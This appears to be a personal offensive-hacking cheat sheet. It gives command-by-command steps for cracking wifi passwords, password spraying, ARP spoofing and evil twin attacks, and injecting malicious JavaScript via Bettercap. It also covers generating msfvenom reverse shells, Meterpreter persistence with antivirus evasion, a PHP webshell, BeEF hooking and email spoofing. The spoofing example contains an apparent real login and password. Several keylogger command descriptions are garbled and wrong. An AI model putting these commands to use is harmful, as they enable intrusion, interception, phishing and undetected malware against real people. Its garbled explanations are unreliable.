- To capture the .cap file from the target address —> airodump-ng -b [MAC.addr] -c [??] --write filename [interfaceName] “+&&+” Deauthenticating Users on an Access Point && trying to capture the handshake—> aireplay-ng --deauth #packets -a target.mac.addr -c ctd.target.mac.addr [interfaceName] 
*Once the handshake is captured, we can quit airodump-ng && airplay-ng* 
 
- Using CRUNCH to create wordlist from a char_sets or download using link *https://github.com/danielmiessler/SecLists *, thereafter you can use syntax—> aircrack-ng captured.filename.cap -w wordlist.filename 
- Other methods include, using online website software(LINODE Servers) with uploading captured.filename and password will b cracked, 
- Also we can pipe crunch made wordlists with captured handshakes thereby using less storage space on our devices, lastly we can increase speed of cracking using GPU rather than CPU or manually add more cpu power. Check Aircrack-ng for more info. “crunch 4 20 abcdefghijklmnopqustuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890 | aircrack-ng captured.filename.cap -e target.ESSID  -w- “
- abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*()~`";.,/[]-=

✔️Step 2: Cracking WPA2 Passwords Using the New PMKID Hashcat Attack
https://null-byte.wonderhowto.com/how-to/hack-wi-fi-cracking-wpa2-passwords-using-new-pmkid-hashcat-attack-0189379/
airmon-ng start wlan0
hcxdumptool -i wlan1mon -o galleria.pcapng
hcxpcaptool -E essidlist -I identitylist -U usernamelist -z galleriaHC.16800 galleria.pcapng
hashcat -m 16800 galleriaHC.16800 -a 0 --kernel-accel=1 -w 4 --force {file_path}

How to Crack WPA & WPA2 Wi-Fi Passwords with Pyrit « Null Byte :: WonderHowTo

## HYDRA is another very fast network-logon online password cracking tool,
The password spraying technique involves circumventing common countermeasures against brute-force attacks, such as the locking of the account due to too many attempts, as the same password is sprayed across many users before another password is attempted which can perform rapid dictionary attacks against more than 50 Protocols, including Telnet, RDP, SSH, FTP, HTTP, HTTPS, SMB, several databases and much more.
The general command-line syntax is: 
hydra -l username -P wordlist.txt {target_IP} service
hydra -l username -P wordlist.txt service://{target_ip}
hydra -L usernames.txt -p wordlist.txt {target_IP} service
where we specify the following options:
    -l username: -l should precede the username, i.e. the login name of the target.
    -P wordlist.txt: -P precedes the wordlist.txt file, which is a text file containing the list of passwords you want to try with the provided username.
    Host is the hostname or IP address of the target server.
    Service / Protocol indicates the service which you are trying to launch the dictionary attack. Telnet, RDP, SSH, FTP, HTTP, HTTPS, SMB, 
There are some extra optional arguments that you can add:
    -s PORT to specify a non-default port for the service in question.
    -V or -vV, for verbose, makes Hydra show the username and password combinations that are being tried. This verbosity is very convenient to see the progress, especially if you are still not confident of your command-line syntax.
    -t n where n is the number of parallel connections to the target. -t 16 will create 16 threads used to connect to the target.
    -d, for debugging, to get more detailed information about what’s going on. The debugging output can save you much frustration; for instance, if Hydra tries to connect to a closed port and timing out, -d will reveal this right away.


## NMAP Information Gathering https://nmap.org/book/toc.html
Nmap Network Mapper Man Page common switches/flags - https://svn.nmap.org/nmap/docs/nmap.usage.txt 
Host Discovery https://nmap.org/book/host-discovery-controls.html
Network Mapper Is used to gather detailed information of clients connected to Access Points. It can be used as a pre and post enumeration.
One of the very first steps in any network reconnaissance mission is to reduce a (sometimes huge) set of IP ranges into a list of active(I.e online) or interesting hosts. Normally, Nmap uses this stage to determine active machines for heavier scanning. Scanning every port of every single IP address is slow and usually unnecessary. 

To disable port scanning >> -sn (This is often known as a “ping scan”) By default, Nmap does host discovery and then performs a port scan against each host it determines is online, This option tells Nmap not to do a port scan after host discovery, forcing it to rely primarily on ICMP echo packets (or ARP requests on a local ethernet network) to identify targets which are online., and only print out the available hosts that responded to the host discovery probes. The -sn option sends an ICMP echo request -PE, a TCP SYN packet to port 443 -PS443, a TCP ACK packet to port 80 -PA80, and an ICMP timestamp request -PP by default. Since unprivileged Unix users (or Windows users without Npcap installed) cannot send these raw packets, only SYN packets are sent instead in those cases. The SYN packet is sent using a TCP connect system call to ports 80 and 443 of the target host. When a privileged user tries to scan targets on a local ethernet network, ARP requests (-PR) are used unless the --send-ip option is specified. 

To disable ping scan >> -Pn (No sending of ping probes) this flag/switch skip host discovery altogether and scan all target IP addresses (active & inactive).  By default, Nmap only performs heavy probing such as port scans, version detection, or OS detection against hosts that are found to be up. Disabling host discovery with the -Pn option (i.e where nmap can’t accurately determine active hosts) causes Nmap to attempt this requested scanning functions against every target IP address specified (active + inactive). So if a class B sized target address space (/16) is specified on the command line, all 65,536 IP addresses are scanned. Proper host discovery is skipped as with a list scan (-sL), but instead of stopping and printing the target list, Nmap continues to perform requested functions as if each target IP is active. 

Note: There are times when you do not want to scan every IP address (-Pn), and other times when you want to perform host discovery without a port scan (-sn). 
A great source of information about networked hosts is DNS, the domain name system. By default, Nmap performs reverse-DNS resolution for every IP which responds to host discovery probes (i.e. those that are online). If host discovery is skipped with -Pn, resolution is performed for all IPs.
Note: In many cases, the most effective way to explore Nmap's behavior given a set of command-line options is to add the --packet-trace option, which prints out all of the packets sent and received by Nmap

### What is Port Scanning?
Port scanning is the act of remotely testing numerous ports to determine what state they are in. The most interesting state is usually open, meaning that an application is listening and accepting connections on the port. These states classified by NMAP are not intrinsic properties of the port itself, but describe how Nmap sees them. The six port states recognized by Nmap

open >>
    An application is actively accepting TCP connections or UDP packets on this port. Finding these is often the primary goal of port scanning. Open ports are also interesting for non-security scans because they show services available for use on the network. 
closed >>
    A closed port is accessible (it receives and responds to Nmap probe packets), but there is no detected application listening on it. They can be helpful in showing that a host is online and using an IP address (host discovery, or ping scanning), and as part of OS detection.
filtered >>
    Nmap cannot determine whether the port is open because packet filtering prevents its probes from reaching the port. 
unfiltered >>
    The unfiltered state means that a port is accessible, but Nmap is unable to determine whether it is open or closed. Only the ACK scan(i.e It is used to map out firewall rulesets, determining whether they are stateful or not and which ports are filtered) classifies ports into this state. Scanning unfiltered ports with other scan types such as Window scan, SYN scan, or FIN scan, may help resolve whether the port is open. 
open|filtered >>
    Nmap places ports in this state when it is unable to determine whether a port is open or filtered. This occurs for scan types in which open ports give no response. The lack of response could also mean that a packet filter dropped the probe or any response it elicited. So Nmap does not know for sure whether the port is open or being filtered. The UDP, IP protocol, FIN, NULL, and Xmas scans classify ports this way.
closed|filtered >>
    This state is used when Nmap is unable to determine whether a port is closed or filtered. It is only used for the IP ID Idle scan called “TCP Idle Scan (-sI)”. 

“Ensure you wireless adapter is connected to the target wifi AP through Kali.”
- NetDiscover Range Discovery—> netdiscover -r target.ip.addr./range
- nmap -T4 -A -v target.ip.addr./range
- nmap -sn target.ip.addr./range === “ping scan”
- nmap -T4 -F target.ip.addr./range === “quick scan”
- nmap -sV -T4 -O -F --version-light target.ip.addr./range === “detailed scan”
- Cheat >> when using Nmap, if we know a hosts is online at a unique target IP, we can first check what ports are open using -p- (I.e checks ports 1-65535) after which we can use the -A aggressive mode to test specific open ports, that Nmap results will help with our enumeration process.

{sudo masscan -p1-65535 Target.Ip --rate=1000 -e tun0 > ports
ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')
nmap -Pn -sV -sC -p$ports Target.IP}

{ports=$(nmap -p1-65535 —min-rate=1000 -T Target.IP | grep ^[0-9] | cut -d ‘/‘ -f 1 | tr ‘\n\’ ‘,’ | sed 's/,$//')
nmap -sV -sC -p$ports Target.IP}

The Nmap Scripting Engine (NSE) is an incredibly powerful addition to Nmap, extending its functionality quite considerably. NSE Scripts are written in the Lua programming language, and can be used to do a variety of things: from scanning for vulnerabilities, to automating exploits for them. The NSE is particularly useful for reconnaisance, however, it is well worth bearing in mind how extensive the script library is. Nmap stores its scripts on Linux at /usr/share/nmap/scripts and MacOSx as /usr/local/share/nmap/scripts. All of the NSE scripts are stored in this directory by default -- this is where Nmap looks for scripts when you specify them.  Nmap uses this file to keep track of (and utilise) scripts for the scripting engine.

-T (Set a timing template 0-5) paranoid (0), sneaky (1), polite (2), normal (3), aggressive (4), and insane (5). The first two are for IDS evasion. Polite mode slows down the scan to use less bandwidth and target machine resources. Normal mode is the default and so -T3 does nothing. Aggressive mode speeds scans up by making the assumption that you are on a reasonably fast and reliable network. Finally insane mode assumes that you are on an extraordinarily fast network or are willing to sacrifice some accuracy for speed.   While -T0 and -T1 may be useful for avoiding IDS evasion alerts, they will take an extraordinarily long time to scan thousands of machines or ports. For such a long scan, you may prefer to set the exact timing values you need rather than rely on the canned -T0 and -T1 values.
The main effects of T0 are serializing the scan so only one port is scanned at a time, and waiting five minutes between sending each probe. T1 and T2 are similar but they only wait 15 seconds and 0.4 seconds, respectively, between probes. T3 is Nmap's default behavior, which includes parallelization. -T4 does the equivalent of --max-rtt-timeout 1250ms --min-rtt-timeout 100ms --initial-rtt-timeout 500ms --max-retries 6 and sets the maximum TCP and SCTP scan delay to 10ms. T5 does the equivalent of --max-rtt-timeout 300ms --min-rtt-timeout 50ms --initial-rtt-timeout 250ms --max-retries 2 --host-timeout 15m --script-timeout 10m --max-scan-delay as well as setting the maximum TCP and SCTP scan delay to 5ms. Maximum UDP scan delay is not set by T4 or T5, but it can be set with the --max-scan-delay option. 
Function	Options
Hostgroup (batch of hosts scanned concurrently) size	--min-hostgroup, --max-hostgroup
Number of probes launched in parallel	--min-parallelism, --max-parallelism
Probe timeout values	--min-rtt-timeout, --max-rtt-timeout, --initial-rtt-timeout
Maximum number of probe retransmissions allowed	--max-retries
Maximum time before giving up on a whole host	--host-timeout
Control delay inserted between each probe against an individual host	--scan-delay, --max-scan-delay
Rate of probe packets sent per second	--min-rate, --max-rate
Defeat RST packet response rate by target hosts	--defeat-rst-ratelimit
-sV (Version detection)
Enables version detection, as discussed above. Alternatively, you can use -A Aggressive Scan, which enables version detection among other things. Having an accurate version number helps dramatically in determining which exploits a server is vulnerable to. Version detection helps you obtain this information. 
-O (Enable OS detection)
Enables OS detection, as discussed above. Alternatively, you can use -A to enable OS detection along with other things. One of Nmap's best-known features is remote OS detection using TCP/IP stack fingerprinting. Nmap sends a series of TCP and UDP packets to the remote host and examines practically every bit in the responses.
 -A (Aggressive scan options)
This option enables additional advanced and aggressive options. Presently this enables OS detection (-O), version scanning (-sV), script scanning (-sC) and traceroute (--traceroute)
Runtime Interaction (press any of this keys whilst nmap is running in foreground)
v / V Increase / decrease the verbosity level
d / D Increase / decrease the debugging Level
p / P Turn on / off packet tracing
? Print a runtime interaction help screen

### Techniques for bypassing firewalls during scans https://nmap.org/book/firewall-subversion.html
*SYN stealth scans -sS, along with NULL -sN, FIN -sF and Xmas scans -sX); however, there is another very common firewall configuration which it's imperative we know how to bypass. Your typical Windows host will, with its default firewall, block all ICMP packets. -Pn, which tells Nmap to not bother pinging the host before scanning it. This means that Nmap will always treat the target host(s) as being alive, effectively bypassing the ICMP block; however, it comes at the price of potentially taking a very long time to complete the scan (if the host really is dead then Nmap will still be checking and double checking every specified port).
There are a variety of other switches which Nmap considers useful for firewall evasion. We will not go through these in detail, however, they can be found here.

    URG: Urgent flag indicates that the urgent pointer filed is significant. The urgent pointer indicates that the incoming data is urgent, and that a TCP segment with the URG flag set is processed immediately without consideration of having to wait on previously sent TCP segments.
    ACK: Acknowledgement flag indicates that the acknowledgement number is significant. It is used to acknowledge the receipt of a TCP segment.
    PSH: Push flag asking TCP to pass the data to the application promptly.
    RST: Reset flag is used to reset the connection. Another device, such as a firewall, might send it to tear a TCP connection. This flag is also used when data is sent to a host and there is no service on the receiving end to answer.
    SYN: Synchronize flag is used to initiate a TCP 3-way handshake and synchronize sequence numbers with the other host. The sequence number should be set randomly during TCP connection establishment.
    FIN: The sender has no more data to send.

The following switches are of particular note:
-f >> Used to fragment the packets (i.e. split them into smaller pieces) making it less likely that the packets will be detected by a firewall or IDS.
--mtu <number> >> accepts a maximum transmission unit size to use for the packets sent.  An alternative to -f, but providing more control over the size of the packets, Don't also specify -f if you use --mtu. The offset must be a multiple of eight.
--scan-delay <time>ms >> used to add a delay between packets sent. This is very useful if the network is unstable, but also for evading any time-based firewall/IDS triggers which may be in place. Port scan detection is usually threshold based. The system watches for a given number of probes in a certain timeframe
--badsum >> Send packets with a bogus TCP/UDP/SCTP checksum. Any real TCP/IP stack would drop this packet, however, firewalls may potentially respond automatically, without bothering to check the checksum of the packet. As such, this switch can be used to determine the presence of a firewall/IDS.

“Skip the port scan (-sn) when you only need to determine what hosts are online/up.
Limit the number of ports scanned. Specify -F to perform a quick scan popular ports on known-online hosts first. That lets you analyze the online hosts and most of the open ports while you start the huge -Pn scan of all TCP and UDP ports with version and OS detection in the background.
Skip advanced scan types (-sC, -sV, -O, --traceroute, and -A) on the large scale scan and then perform them on individual ports as necessary later.
Remember to turn off DNS resolution when it isn't necessary. “

Misleading Intrusion Detection Systems
https://nmap.org/book/subvert-ids.html



*M_I_T_M Man-in-The-Middle Attack*
Exploiting ARP(address resolution protocol) —>Simple protocol used to map IP address of a machine to it’s MAC addresses. Other useful tools are ARPSpoof, Cain&Abel, Ettercap, BetterCap, ARPPoison.

*Install ARP-Spoof with apt-get install dsniff
Use syntax———>  arpspoof -i [interfaceName] -t [clientIP] [A.P gatewayIP]
Split Terminal——> arpspoof -i [interfaceName] -t [A.P gatewayIP] [clientIP]
Initiate Port-Forwarding----> echo 1 > /proc/sys/net/ipv4/ip_forward

*Evil Twin Attack*
Is when a hacker sets up a fake wifi network that looks like a legitimate access point to steal victims sensitive details/data. How does it work?? 
Start a fake Access Point with the same identical name as the target network. ——> Disconnect/Deauth a connected client ——> Wait for them to connect to the Evil twin/fake access point created, once connected, automatically display a page asking for the network key/password to the target/previous connected access point.
Creating Wifi_Hotspot , first install & build wifi-hotspot from GitHub repo, ensure your wireless adapter is in managed mode and not monitor mode.
—>systemctl start create_ap
—>create_ap wlan0 eth0 wifi_bssid/name


## BetterCap supports GNU/Linux, BSD, Android, Apple macOS and the Microsoft Windows
https://github.com/bettercap/bettercap or apt-get install bettercap
bettercap help && bettercap --help && help BettercapModules
Initiate Bettercap using Network interface to bind to—> betterCap -iface [interfaceName]
Bettercap is made easier with the use of caplets(I.e simultaneously combines commands together), after making a .cap file using regular text editor—>bettercap -iface [interfaceName] -caplet filename.cap
Start by net.probe the Access Points similar to NetDiscover & Nmap(I.e net.recon is auto-configured to switch on), after which you ARP.spoof connected target client(s) to the access points (MITM Attack) *set arp.spoof.fullduplex true*, after which you net.sniff the data resources sent by the target client(s) Transport & Application layer(❌HTTPS) via networking protocols. Remember to use this command to enable IP forwarding while using many network security/sniffing tools on linux *echo 1 > /proc/sys/net/ipv4/ip_forward*.
To Monitor and capture HTTPS traffic we downgrade the network to HTTP using caplets.show find caplet with name *hstshijack* “Learn how to edit this caplets” . This can also be achieved via SSL strip in the http.proxy module set to true.
☞Local UI➡️ If you want both bettercap and the web ui running on your computer, you’ll want to use the http-ui caplet which will start the api.rest and http.server modules on 127.0.0.1.
Edit the default credentials in /usr/local/share/bettercap/caplets/http-ui.cap and then start the ui with: *sudo bettercap -caplet http-ui* Open your browser to http://127.0.0.1/ and login using the credentials you configured in the previous step.
☞Remote UI➡️ If instead you’re running bettercap on another host, say on a RaspberryPI or another machine with a different IP address, you want to use the https-ui caplet in order for the connection to the UI and the api to be protected by TLS. The caplet will bind the modules on 0.0.0.0 and generate a self signed certificate you can then allow in your browser. Edit the default credentials in /usr/local/share/bettercap/caplets/https-ui.cap and then start the ui with: *sudo bettercap -caplet https-ui* Open your browser to https://<ip of the machine>/ and login using the credentials you configured in the previous step.

Javascript Code Injection via Bettercap:===>Research or Create Javascript Malicious Code.js to Inject. Next we edit usr/local/share/bettercap/caplets/hstshijack/hstshijack.cap file by appending the filePath of [Malicious code.js] into the *set hstshijack.payloads* arguments. hstspreload.org Through this website we can copy & paste website URL to detect is HSTS is enabled && https://www.ssllabs.com/ssltest/ to check if SSL is configured properly. To bypass HSTS policy, we can DNS spoof Target. 

DNS Spoofing, therefore we can spoof this req-res protocol by being MITM and redirecting our victims to malicious websites either by Javascript Code Injection or fake HTML pages. Kali has an Apache server, which we start with command —> service apache2 start 
It’s html pages are loaded from “/var/www/html” …Research malicious html pages and replace if need be. Using dns.spoof *help* we can set parameters by appending into our original caplet filename.cap to run sequentially with our previous parameters.

*BEST PRACTICE, CAPTURE DATA PACKETS, SAVE TO A FILE && ANALYSE LATER WITH WIRESHARK*
Using *set net.sniff.output [newCapturedFileName.cap]* this can be added to our sequential caplet file whilst using CLI interface or manually set via the GUI web interface *before switching net.sniff on*


Gaining Access & Information Gathering—> Client-Side && Server-Side Attacks
## Metasploit Framework: 

This is a set of tools that allow information gathering, scanning, exploitation, exploit development, post-exploitation, and more. While the primary usage of the Metasploit Framework focuses on the penetration testing domain, it is also useful for vulnerability research and exploit development.
The main components of the Metasploit Framework can be summarized as follows;
1. msfconsole: The main command-line interface.
2. Modules: Modules are small components within the Metasploit framework that are built to perform a specific task, such as exploiting a vulnerability, scanning a target, or performing a brute-force attack. 
3. Tools: Stand-alone tools that will help vulnerability research, vulnerability assessment, or penetration testing. Some of these tools are msfvenom, pattern_create and pattern_offset.  

Vulnerability: A design, coding, or logic flaw affecting the target system. The exploitation of a vulnerability can result in disclosing confidential information or allowing the attacker to execute code on the target system.
Exploit: A piece of code that will take advantage of a vulnerability present on the target system.  If we want the exploit to have the result we want (gaining access to the target system, read confidential information, etc.), we need to use a payload. Most of the exploits will have a preset default payload. However, you can always use the show payloads command to list other commands you can use with that specific exploit. 

Payload: These are the code that will run on the target system. Running command on the target system is already an important step but having an interactive connection that allows you to type commands that will be executed on the target system is better. Such an interactive command line is called a "shell". Metasploit offers the ability to send different payloads that can open shells on the target system. 
Three different directories under payloads: singles, stagers and stages.
Singles: Self-contained payloads (add user, launch notepad.exe, etc.) that do not need to download an additional component to run.
Stagers: Responsible for setting up a connection channel between Metasploit and the target system. Useful when working with staged payloads. “Staged payloads” will first upload a stager on the target system then download the rest of the payload (stage). This provides some advantages as the initial size of the payload will be relatively small compared to the full payload sent at once.
Stages: Downloaded by the stager. This will allow you to use larger sized payloads.

    Staged payloads are sent in two parts. The first part is called the stager. This is a piece of code which is executed directly on the server itself. It connects back to a waiting listener, but doesn't actually contain any reverse shell code by itself. Instead it connects to the listener and uses the connection to load the real payload, executing it directly and preventing it from touching the disk where it could be caught by traditional anti-virus solutions. Thus the payload is split into two parts -- a small initial stager, then the bulkier reverse shell code which is downloaded when the stager is activated. Staged payloads require a special listener -- usually the Metasploit multi/handler, which will be covered in the next task.
    Stageless payloads are more common -- It is a binary that includes all of the required parts of Meterpreter, along with any required extensions, all bundled into one. They are entirely self-contained in that there is one piece of code which, when executed, sends a shell back immediately to the waiting listener.
“Stageless payloads are denoted with underscores (_).  As staged payloads are denoted with another forward slash (/)”

*Search This command will search the Metasploit Framework database for modules relevant to the given search parameter
*The exploit/run command can be used without any parameters or using the “-z” parameter. The “run/exploit -z” command will run the exploit and background the session as soon as it opens.  “Run/exploit -j” command which tells Metasploit to launch the module, running as a job in the background.
*sessions -i <number> to select the appropriate session to foreground.

    RHOSTS: “Remote host”, the IP address of the target system. A single IP address or a network range can be set. This will support the CIDR (Classless Inter-Domain Routing) notation (/24, /16, etc.) or a network range (10.10.10.x – 10.10.10.y). You can also use a file where targets are listed, one target per line using file:/path/of/the/target_file.txt, as you can see below.

    RPORT: “Remote port”, the port on the target system the vulnerable application is running on.
    PAYLOAD: The payload you will use with the exploit.
    LHOST: “Localhost/ListenHost”, the attacking machine IP address.
    LPORT: “Local port/Listen Port”, the port you will use for the reverse shell to connect back to. This is a port on your attacking machine, and you can set it to any port not used by any other application.
    SESSION: Each connection established to the target system using Metasploit will have a session ID. You will use this with post-exploitation modules that will connect to the target system using an existing connection.

The setg command sets a global value that will be used until you exit Metasploit or clear it using the unsetg command.

Once a vulnerability has been successfully exploited, a session will be created. This is the communication channel established between the target system and Metasploit TERMINAL. You can use the background command CTRL+Z to background the session prompt and go back to the msfconsole prompt. The sessions command can be used from the msfconsole prompt or any context to see the existing sessions.

MSFVENOM: is used to generate code for primarily reverse and bind shells. It is used extensively in lower-level exploit development to generate hexadecimal shellcode when developing something like a Buffer Overflow exploit; Msfvenom allows you to create payloads in many different formats (PHP, exe, dll, elf, etc, .aspx, .war, .py).) and for many different target systems (Apple, Windows, Android, Linux, etc.)
The standard syntax for msfvenom : msfvenom -p <PAYLOAD> <OPTIONS>

Linux Executable and Linkable Format (elf) 
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
The .elf format is comparable to the .exe format in Windows. These are executable files for Linux. However, you may still need to make sure they have executable permissions on the target machine. For example, once you have the shell.elf file on your target machine, use the chmod +x shell.elf command to accord executable permissions. Once done, you can run this file by typing ./shell.elf on the target machine command line.
Windows
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe

PHP
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php

ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp

Python
msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py

-f <format> Specifies the output format. 
-o <file> The output location and filename for the generated payload.
Contrary to some beliefs, encoders do not aim to bypass antivirus installed on the target system. As the name suggests, they encode the payload. While it can be effective against some antivirus software, using modern obfuscation techniques or learning methods to inject shellcode is a better solution to the problem. The example below shows the usage of encoding (with the -e parameter) 
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64

Multi/Handler: It's essential if you want to use Meterpreter shells, and is the go-to when using staged payloads. The term commonly used to receive a connection from a target is 'catching a shell'. Reverse shells or Meterpreter callbacks generated in your MSFvenom payload can be easily caught using a handler. The module can be used with the “use exploit/multi/handler” command. You will need to set up the handler accordingly with the payload, LHOST and LPORT parameters. These values will be the same you have used when creating the msfvenom payload.
Multi handler supports all Metasploit payloads and can be used for Meterpreter as well as regular shells.

Auxiliary: Any supporting module, such as scanners, crawlers and fuzzers, can be found here.
Encoders: Encoders will allow you to encode the exploit and payload in the hope that a signature-based antivirus solution may miss them. 
Evasion: While encoders will encode the payload, they should not be considered a direct attempt to evade antivirus software. 
NOPs: NOPs (No OPeration) do nothing, literally. They are represented in the Intel x86 CPU family they are represented with 0x90, following which the CPU will do nothing for one cycle. They are often used as a buffer to achieve consistent payload sizes.
Post: Post modules will be useful on the final stage of the penetration testing process listed above, post-exploitation. I.e post module to convert a shell to meterpreter shell in metasploit is “post/multi/manage/shell_to_meterpreter”

Payload Templates
Location: /modules/payloads/singles/ - https://github.com/rapid7/metasploit-framework/tree/master/modules/payloads/singles
Description: This directory contains single-shot payloads that do not create a staged connection. These are simpler and can be useful for understanding basic payload structures.

Staged Payloads
Location: /modules/payloads/stagers/ - https://github.com/rapid7/metasploit-framework/tree/master/modules/payloads/stagers
Description: Stagers set up a network connection between the victim and the attacker, allowing the attacker to send a more complex second stage payload.

Stageless Payloads
Location: /modules/payloads/stageless/
Description: These payloads include all necessary components in one go, without needing a separate stager.

Payload Utilities
Location: /lib/msf/core/payload/ - https://github.com/rapid7/metasploit-framework/tree/master/lib/msf/core/payload
Description: This directory often contains core libraries and utilities that support payload generation and manipulation. It's a good place to look for underlying mechanisms and exported helper methods to the Payload scripts.

Post-exploitation Modules
Location: /modules/post/
Description: While not directly related to initial payload creation, these modules can provide context on what happens after a successful exploitation, which might relate to or influence payload design.


## Metasploit_DataBase https://www.offensive-security.com/metasploit-unleashed/using-databases/

Metasploit has a database function to simplify project management and avoid possible confusion when setting up parameter values. To initialize this database we have to “systemctl/launchctl start postgresql” which will be the web service our database runs in. Next we initialize it using “msfdb init”. You can now launch msfconsole and check the database status using the db_status command.
The database feature will allow you to create workspaces to isolate different projects. When first launched, you should be in the default workspace. You can list available workspaces using the workspace command. 

You can add a workspace using the -a parameter or delete a workspace using the -d parameter, respectively. i.e workspace -a newProject
If you want to run a Nmap scan using the db_nmap, all results will be saved to the database. You can now fetch information relevant to active hosts and services running on target systems with the ‘hosts’ and ‘services’ commands, respectively. The hosts -h and services -h commands can help you become more familiar with available options. 
Once the host information is stored in the database, you can use the ‘hosts -R’ command to add this value to the RHOSTS parameter. 
 
## ExploitDB tends to be very useful for hackers, as it often actually contains exploits that can be downloaded and used straight out of the box. It tends to be one of the first stops when you encounter software in a CTF or pentest.
If you're inclined towards the CLI on Linux, Kali comes pre-installed with a tool called "searchsploit" which allows you to search ExploitDB from your own machine. This is offline, and works using a downloaded version of the database, meaning that you already have all of the exploits already on your Kali Linux “Searchsploit is basically just a command line search tool for exploit-db.com”
A CVE, short for Common Vulnerabilities and Exposures, is a list of publicly disclosed computer security flaws. When someone refers to a CVE, they usually mean the CVE ID number assigned to a security flaw. So when exploiting you can check for those on:
https://www.cvedetails.com/
https://cve.mitre.org/
However using https://virustotal.com we are able to upload our payload crosscheck it’s performance against major antivirus softwares, ensuring it returns clean. Veil Update ===> Undetectable Backdoors ===> Antivirus Update ===> Detectable Backdoors.
https://www.rapid7.com/try/nexpose/  Another Recommended Enterprise level framework by RAPID7 is NexPose which works similarly to Metasploit I.e Discover Open Ports & Running Services, Find Vulnerabilities, Find Exploits, Verify them, with extra useful features such as Generating Reports && Automate Scans.


## Post Exploitation Attacks 
MeterPreter➡️ Meterpreter shells are Metasploit's own brand of fully-featured shell. Meterpreter is a Metasploit payload that supports the penetration testing process with many valuable components. Meterpreter will run on the target system and act as an agent within a command and control architecture. You will interact with the target operating system and files and use Meterpreter's specialized commands. 
Meterpreter runs on the target system but is not installed on it. It runs in memory and does not write itself to the disk on the target. This feature aims to avoid being detected during antivirus scans. By default, most antivirus software will scan new files on the disk (e.g. when you download a file from the internet) Meterpreter runs in memory (RAM - Random Access Memory) to avoid having a file that has to be written to the disk on the target system (e.g. meterpreter.exe). This way, Meterpreter will be seen as a process and not have a file on the target system. 
Once connected to a target computer, we can run commands just like we would any other system, however ensure to use the sysinfo to deduce information about the target operating system and permissions….Other commands include download, upload, pwd, mkdir, etc…Typing help on any Meterpreter session (shown by meterpreter> at the prompt) will list all available commands.
Maintaining Access can be difficult after initial connection, various methods tried and tested are as follows; the most sustainable is Metasploit(Meterpreter) + Veil-Evasion(create custom backdoor)
Using Veil-Evasion modules 
Rev_http_service
Rev_tcp_service
Upload and execute from Meterpreter
Using Persistence Module
>run persistence -h //This might be detectable by antivirus programs
Using Metasploit + Veil-Evasion // More robust + Undetectable by Antivirus
>use exploit/windows/local/persistence
>set session [session id]
>set exe::custom [backdoor location]
>exploit
Key Logging➡️ Log all mouse/keyboard events of target computer
Keyscan_start ===>Shows current working directory
keyscan_dump ===>Lists files in the current working directory
keyscan_stop ===>Changes working directory to [location specified]
Screenshot ====> Take a screenshot of the target computer
Pivoting➡️ Using the hacked target device as a pivot to try to gain access to other devices In the same local network.

"Webshell" is a colloquial term for a script that runs inside a webserver (usually in a language such as PHP or ASP) which executes code on the server. Essentially, commands are entered into a webpage -- either through a HTML form, or directly as arguments in the URL -- which are then executed by the script, with the results returned and written to the page. This can be extremely useful if there are firewalls in place, or even just as a stepping stone into a fully fledged reverse or bind shell.
As PHP is still the most common server side scripting language, let's have a look at some simple code for this. In a very basic one line format:

<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>

This will take a GET parameter in the URL and execute it on the system with shell_exec(). Essentially, what this means is that any commands we enter in the URL after ?cmd= will be executed on the system -- be it Windows or Linux. The "pre" elements are to ensure that the results are formatted correctly on the page.

https://www.youtube.com/watch?v=vSYUhaTUp1E
https://tryhackme.com/room/introtoshells


## *BEEF Browser Exploitation Framework* Allows us to launch a number of attacks on a hooked target, Target are hooked once they load a hook URL. 
Start by searching your application on Kali *Beef Start* Once it’s started we can login to the browser UI and monitor hooked systems. Using the Hook.js file we can edit our apache server HTML page with our system IP address, start our Apache server so it listens for connection, Once a browser visits our IP address, it automatically hooked. We can enhance our index.html page to have more than just a blank page, do remember however to embed the hook.js into the script tag. 
DNS spoof requests to a page containing the hook
- Social Engineer the target to open a hook page 
- Use XSS exploit

## *BEEF Browser Exploitation Framework && Bettercap*
Inject the hook in browsed pages (need to be MITM via bettercap), this is easily done by editing including a custom malicious Javascript file with BEEF configurations(I.e inject_beef.js from ZSecurity) into the bettercap hstshijack.payloads @ usr/share/bettercap/caplets/hstshijack text document, ensure to also make {file_path} accessible to bettercap. 

## BEEF/Metasploit/Veil-Evasion Attacks on Clients outside your LAN* This can be achieved through Port forwarding through your access point router.
Note: public IP(WAN) == Access Point/Router public IP && private IP(LAN via DHCP is shared by the Access point/Router to Connected Clients i.e Gateway Address/24). Request made to the Internet by connected clients is routed via the access point and hence the visible IP address on the internet is the Access point Routing Address. 
To send a backdoor/exploits I.e reverse_http over the internet to Target, SET up our Metasploit && Beef and configuring their parameters I.e LHOST, LPORT, Index.html{embedded hook.js},  to use our public IP & designated port# where necessary and also start our apache server to serve malicious webpages to our target. Next we configure port forwarding rules on our A.P/Router to listen for connections using our private IP(LAN), this will ensure that any incoming connection received on your router via a designated port is forwarded back to you. This includes rules for Apache server, Beef, Metasploit payloads connections.
The Trick here is use External IP/Public IP address for outbound connections(WAN) && whilst listening for inbound connections use router configured port forwarding rules, & Private IP address

## Social Engineering & Information Gathering using *Maltego* 
pass


*EMAIL Spoofing* Use of SendinBlue or other paid mailing services that offer SMTP servers, we can customize our email into a disguise to bypass receiving email anti-spam algorithm. In Kali we use a program called *SENDEMAIL* and check the —help to set the options.
Syntax Ex: sendemail -xu jennocrypto@aol.com -xp dHENL09TDUr2CAVs -s  smtp-relay.sendinblue.com:587 -f “From Email” -t “To Email” -u “Email Subject” -m “Email Content” -o message-header=“From: Allan Smith <service@linode.com>"
